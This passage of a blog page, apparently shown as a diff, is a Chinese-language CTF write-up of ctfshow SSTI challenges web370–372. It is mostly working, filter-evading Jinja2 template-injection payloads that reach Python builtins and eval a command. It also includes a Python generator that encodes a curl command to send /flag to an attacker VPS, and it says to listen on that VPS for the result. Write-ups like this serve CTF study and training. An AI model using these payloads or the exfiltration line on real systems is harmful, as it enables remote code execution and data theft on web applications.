em=a)|join,a,a)|join()%}%20{%%20set%20built=(a,a,dict(builtins=a)|join,a,a)|join()%}%20{%%20set%20x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}%20{%%20set%20chr=x.chr%}%20{%%20set%20cmd=chr(eeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeee)%2bchr(eee)%2bchr(ee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(ee)%2bchr(eeee)%2bchr(eeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eee)%2bchr(ee)%2bchr(eeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(e)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeee)%2bchr(eeeeee)%2bchr(eeeeee)%2bchr(eeeeeeeeeeee)%2bchr(eeeee)%2bchr(eeeeeeeee)%2bchr(eeeeeeeee)%2bchr(eeeeeeeee)%2bchr(eeeee)%2bchr(eeeeeeee)%2bchr(eeeeeeeeeeee)%2bchr(eeeeeee)%2bchr(eeeee)%2bchr(eeeeeeee)%2bchr(eeeeeeeeeee)%2bchr(eeeeeeeeeee)%2bchr(eeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeee)%2bchr(eeeeeee)%2bchr(eeeeeeeee)%2bchr(eeeeeeeeee)%2bchr(eeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(e)%2bchr(eeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeee)%2bchr(ee)%2bchr(eeee)%2bchr(eeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeee)%2bchr(eeeeeeeeeeeeeeeeeeeee)%2bchr(eee)%2bchr(eeee)%20%}%20{%if%20x.eval(cmd)%}%20abc%20{%endif%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后到vps上监听本地对应端口得到flag</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240307191509614.png" title="image-20240307191509614" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240307191509614.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240307191509614.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240307191509614.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240307191509614.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240307191509614.png 2x"
+            sizes="auto"
+            alt="image-20240307191509614">
+    </a></figure></p>
+<h3 id="web371过滤args_osrequest数字print" class="headerLink">
+    <a href="#web371%e8%bf%87%e6%bb%a4args_osrequest%e6%95%b0%e5%ad%97print" class="header-mark"></a>[web371]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os、{{、request、数字、{%print</h3><h4 id="payload1web370反弹shell" class="headerLink">
+    <a href="#payload1web370%e5%8f%8d%e5%bc%b9shell" class="header-mark"></a>payload1：web370反弹shell</h4><h4 id="payload2payload固定里面的一部分cmd用脚本生成" class="headerLink">
+    <a href="#payload2payload%e5%9b%ba%e5%ae%9a%e9%87%8c%e9%9d%a2%e7%9a%84%e4%b8%80%e9%83%a8%e5%88%86cmd%e7%94%a8%e8%84%9a%e6%9c%ac%e7%94%9f%e6%88%90" class="header-mark"></a>payload2：payload固定，里面的一部分<code>cmd</code>用脚本生成</h4><p>payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name=
+</span></span><span class="line"><span class="cl">{% set c=(t|count)%}
+</span></span><span class="line"><span class="cl">{% set cc=(dict(e=a)|join|count)%}
+</span></span><span class="line"><span class="cl">{% set ccc=(dict(ee=a)|join|count)%}
+</span></span><span class="line"><span class="cl">{% set cccc=(dict(eee=a)|join|count)%}
+</span></span><span class="line"><span class="cl">{% set ccccc=(dict(eeee=a)|join|count)%}
+</span></span><span class="line"><span class="cl">{% set cccccc=(dict(eeeee=a)|join|count)%}
+</span></span><span class="line"><span class="cl">{% set ccccccc=(dict(eeeeee=a)|join|count)%}
+</span></span><span class="line"><span class="cl">{% set cccccccc=(dict(eeeeeee=a)|join|count)%}
+</span></span><span class="line"><span class="cl">{% set ccccccccc=(dict(eeeeeeee=a)|join|count)%}
+</span></span><span class="line"><span class="cl">{% set cccccccccc=(dict(eeeeeeeee=a)|join|count)%}
+</span></span><span class="line"><span class="cl">{% set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)%}
+</span></span><span class="line"><span class="cl">{% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)%}
+</span></span><span class="line"><span class="cl">{% set coun=(ccc~ccccc)|int%}
+</span></span><span class="line"><span class="cl">{% set po=dict(po=a,p=a)|join%}
+</span></span><span class="line"><span class="cl">{% set a=(()|select|string|list)|attr(po)(coun)%}
+</span></span><span class="line"><span class="cl">{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
+</span></span><span class="line"><span class="cl">{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
+</span></span><span class="line"><span class="cl">{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
+</span></span><span class="line"><span class="cl">{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
+</span></span><span class="line"><span class="cl">{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
+</span></span><span class="line"><span class="cl">{% set chr=x.chr%}
+</span></span><span class="line"><span class="cl">{% set cmd=【xxx】
+</span></span><span class="line"><span class="cl">%}
+</span></span><span class="line"><span class="cl">{%if x.eval(cmd)%}
+</span></span><span class="line"><span class="cl">abc
+</span></span><span class="line"><span class="cl">{%endif%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>生成cmd的脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">def aaa(t):
+</span></span><span class="line"><span class="cl">	t=&#39;(&#39;+(int(t[:-1:])+1)*&#39;c&#39;+&#39;~&#39;+(int(t[-1])+1)*&#39;c&#39;+&#39;)|int&#39;
+</span></span><span class="line"><span class="cl">	return t
+</span></span><span class="line"><span class="cl">s=&#39;__import__(&#34;os&#34;).popen(&#34;curl http://vps-ip:9023?p=`cat /flag`&#34;).read()&#39;
+</span></span><span class="line"><span class="cl">def ccchr(s):
+</span></span><span class="line"><span class="cl">	t=&#39;&#39;
+</span></span><span class="line"><span class="cl">	for i in range(len(s)):
+</span></span><span class="line"><span class="cl">		if i&lt;len(s)-1:
+</span></span><span class="line"><span class="cl">			t+=&#39;chr(&#39;+aaa(str(ord(s[i])))+&#39;)%2b&#39;
+</span></span><span class="line"><span class="cl">		else:
+</span></span><span class="line"><span class="cl">			t+=&#39;chr(&#39;+aaa(str(ord(s[i])))+&#39;)&#39;
+</span></span><span class="line"><span class="cl">	return t
+</span></span><span class="line"><span class="cl">print(ccchr(s))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240307192751635.png" title="image-20240307192751635" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240307192751635.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240307192751635.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240307192751635.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240307192751635.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240307192751635.png 2x"
+            sizes="auto"
+            alt="image-20240307192751635">
+    </a></figure></p>
+<h3 id="web372过滤args_osrequest数字printcount" class="headerLink">
+    <a href="#web372%e8%bf%87%e6%bb%a4args_osrequest%e6%95%b0%e5%ad%97printcount" class="header-mark"></a>[web372]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os、{{、request、数字、{%print、count</h3><p>利用上题的payload2，<code>count</code>换成<code>length</code></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240309202914705.png" title="image-20240309202914705" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240309202914705.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240309202914705.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240309202914705.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240309202914705.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240309202914705.png 2x"
+            sizes="auto"
+            alt="image-20240309202914705">
+    </a></figure></p>
+<p>参考：</p>
+<p><a href="https://blog.csdn.net/Jayjay___/article/details/132210050" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/Jayjay___/article/details/132210050</a></p>
+<p><a href="https://www.freebuf.com/articles/web/325473.html" target="_blank" rel="noopener noreferrer">https://www.freebuf.com/articles/web/325473.html</a></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-02-08</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/ctfshow_ssti/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\ctfshow_ssti.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\ctfshow_ssti.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20ctfshow_ssti&body=|Field|Value|%0A|-|-|%0A|Title|ctfshow_ssti|%0A|Url|http://scofield1920.github.io/ctfshow_ssti/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\ctfshow_ssti.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/ctfshow_ssti/" data-title="ctfshow_ssti" data-hashtags="CTF,web"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/ctfshow_ssti/" data-hashtag="CTF"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/ctfshow_ssti/" data-title="ctfshow_ssti"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/ctfshow_ssti/" data-title="ctfshow_ssti"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/ctfshow_ssti/" data-title="ctfshow_ssti"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/ctfshow_ssti/" data-title="ctfshow_ssti" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;ctfshow_ssti&#34;, &#34;http://scofield1920.github.io/ctfshow_ssti/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/web/">web</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/docker_gzctf/" class="prev" rel="prev" title="GZCTF搭建"><i class="fas fa-angle-left fa-fw"></i>GZCTF搭建</a>
+            <a href="/zkssb4/" class="next" rel="next" title="第四届“中科实数杯”全国电子数据取证与司法鉴定挑战赛">第四届“中科实数杯”全国电子数据取证与司法鉴定挑战赛<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.120.4">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
